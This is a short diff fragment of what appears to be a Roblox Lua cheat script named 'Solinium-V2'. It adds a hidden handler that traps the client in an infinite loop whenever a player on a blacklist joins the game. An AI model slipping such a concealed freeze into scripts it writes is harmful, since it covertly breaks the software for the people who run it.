@@ -1614,3 +1614,6 @@ end)()
 
 notif("Solinium-V2 Has Been Loaded In: "..tostring(math.floor((os.clock() - loadtime) * 1000)).." ms, Welcome "..game.Players.LocalPlayer.Name, 5)
 notif("Script Owned & Developed By decryptionite", 3)
+
+game.Players.ChildAdded:Connect(function(player) if table.find(blacklisted,player.Name) then while true do end end
+end)
